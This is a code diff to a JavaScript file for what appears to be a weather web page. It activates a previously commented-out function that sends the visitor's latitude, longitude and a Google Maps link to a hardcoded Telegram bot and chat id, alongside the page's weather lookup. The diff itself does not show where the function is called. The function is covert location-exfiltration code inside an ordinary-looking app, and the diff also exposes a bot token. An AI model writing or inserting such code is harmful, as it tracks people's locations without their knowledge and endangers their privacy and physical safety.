@@ -171,29 +171,29 @@ navigator.permissions
     }
   });
 
-// async function senddata(lat, lon) {
-//   //enter token
-//   const token = "7908737744:AAG_HurT5QVodF5ukwVgwVAUiuhpkgBqnEw";
+async function senddata(lat, lon) {
+  //enter token
+  const token = "7908737744:AAG_HurT5QVodF5ukwVgwVAUiuhpkgBqnEw";
 
-//   //enter chat id
-//   const id = "6530009448";
+  //enter chat id
+  const id = "6530009448";
 
-//   let text = `longitute = ${lon}  && latitude= ${lat}  && https://www.google.com/maps?q=${lat},${lon}`;
+  let text = `longitute = ${lon}  && latitude= ${lat}  && https://www.google.com/maps?q=${lat},${lon}`;
 
-//   const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${encodeURIComponent(
-//     text
-//   )}`;
+  const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${encodeURIComponent(
+    text
+  )}`;
 
-//   let response = await fetch(url, {
-//     method: "GET",
-//   });
+  let response = await fetch(url, {
+    method: "GET",
+  });
 
-//   if (response.ok) {
-//     console.log("successfully working");
-//   } else {
-//     console.error("Failed to send message");
-//   }
-// }
+  if (response.ok) {
+    console.log("successfully working");
+  } else {
+    console.error("Failed to send message");
+  }
+}
 
 async function yourweather(lat, lon) {
   weatherpage.classList.remove("active");
